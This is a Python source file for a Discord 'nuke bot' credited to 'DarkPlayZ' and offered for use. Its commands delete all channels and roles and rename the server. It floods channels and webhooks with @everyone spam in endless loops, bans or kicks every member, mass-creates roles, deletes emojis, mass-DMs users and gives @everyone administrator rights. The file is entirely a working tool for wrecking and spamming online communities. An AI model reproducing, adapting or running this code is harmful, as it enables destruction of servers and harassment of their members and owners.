#made by DarkPlayZ :)
import discord
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from webserver import keep_alive

dark = commands.Bot(command_prefix="+", intents = discord.Intents.all())
dark.remove_command('help')
######################################setup########################################

token = os.getenv("TOKEN")

channel_names = ['Nuked by Dark playZ', 'Dark Playz on top', 'Beamed By Dark PlayZ', 'Dark PlayZ op', 'Fucked by Dark playZ']
message_spam = ['@everyone wizzed by Dark PlayZ https://discord.gg/lgnontop https://discord.gg/xeop']
webhook_names = ['Dark playZ On Top', 'DarkPlayZ On Top']

###################################################################################
keep_alive() 
@dark.event
async def on_ready():
  await dark.change_presence(activity=discord.Game(name= "TEAM LEGION ON TOP"))#change this if you want
  print(f'''
  
DARK PLAYZ OP

\x1b[38;5;172mLogged In As {dark.user}
\x1b[38;5;172mType +help To Begin Nuking
\x1b[38;5;172mVersion: v1
\x1b[38;5;172m═══════════════════════════
''')

@dark.command()
async def nuke(ctx, amount=50):
  await ctx.message.delete()
  await ctx.guild.edit(name="TRASHED BY DARK PLAYZ")#change this if u want
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To Delete Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in list (ctx.guild.members):
        try:
          await member.ban(reason="DarkPlayZ nuke bot")#change this if u want
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
          

@dark.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@dark.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@dark.command()
async def banall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
  


@dark.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="DarkPlayZ nuke Bot")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@dark.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"TRASHED BY DARK PLAYZ")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@dark.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@dark.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@dark.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")


@dark.command()
async def help(ctx, *args):
    await ctx.message.delete()
    retStr = str("""```fix\n+nuke - Destroys Guild\n\n+banall - Bans All Members \n\n+kickall - Kicks All Members\n\n+rolespam - Spams Roles\n\n+emojidel - Deletes All Emojis\n\nnone\n\n+admin - Gives Everyone Admin```""")
    embed = discord.Embed(color=14177041,title="DarkPlayZ Nuke Bot 24/7")
    embed.add_field(name="DarkPlayZ Nuke Bot Help Commands",value=retStr)
    embed.set_footer(text=f"Requested By {ctx.author} |  Nuke Bot 24/7 | Made By Dark playZ")

    await ctx.send(embed=embed)


dark.run(os.getenv("TOKEN"), bot=True)